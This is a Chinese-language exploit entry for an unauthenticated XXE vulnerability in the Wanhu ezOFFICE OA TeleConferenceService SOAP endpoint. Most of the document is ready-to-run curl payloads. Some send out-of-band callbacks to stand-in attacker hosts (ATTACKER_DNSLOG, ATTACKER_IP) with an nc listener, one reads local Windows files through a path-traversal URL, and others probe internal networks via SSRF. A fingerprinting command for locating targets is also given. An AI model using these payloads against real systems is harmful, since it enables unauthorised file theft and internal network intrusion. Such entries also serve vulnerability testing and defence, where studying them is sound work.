---
id: WANHU-XXE
title: 万户OA ezOFFICE TeleConferenceService XXE注入漏洞
product: wanhu-oa
vendor: 万户网络
version_affected: "all versions"
severity: HIGH
tags: [ssrf, file_read, 无需认证, 国产, oa]
fingerprint: ["万户", "ezOFFICE", "万户网络"]
---

## 漏洞描述

万户OA（ezOFFICE）的 TeleConferenceService SOAP 接口存在 XXE（XML 外部实体注入）漏洞，攻击者通过构造恶意 XML 实体，可实现服务端请求伪造（SSRF）、内网探测和敏感文件读取。

## 影响版本

- 万户OA ezOFFICE（所有已知版本）

## 前置条件

- 无需认证
- 目标运行万户OA ezOFFICE
- TeleConferenceService 接口可达

## 利用步骤

1. 确认目标为万户OA
2. 向 TeleConferenceService 发送包含外部实体的 XML 请求
3. 通过 DNSLog/HTTP 回调验证 XXE 漏洞
4. 利用 XXE 读取文件或探测内网

## Payload

**DNSLog 外带验证**

```bash
curl -s "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService" \
  -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://ATTACKER_DNSLOG" >]>
<value>&xxe;</value>'
```

**读取本地文件（Windows）**

```bash
curl -s "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService" \
  -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<value>&xxe;</value>'
```

**HTTP 回调（SSRF）**

```bash
curl -s "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService" \
  -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8888/xxe_confirm" >]>
<value>&xxe;</value>'
# 攻击机监听: nc -lvp 8888
```

## 验证方法

```bash
# 方法一：DNSLog 外带
curl -s "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService" \
  -X POST -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_DNSLOG">]><value>&xxe;</value>'
# 检查 DNSLog 平台是否收到请求

# 方法二：HTTP 回调
# 攻击机: nc -lvp 8888
curl -s "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService" \
  -X POST -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8888/xxe">]><value>&xxe;</value>'
```

## 指纹确认

```bash
curl -s "http://target/defaultroot/" | grep -i "ezOFFICE\|万户"
```
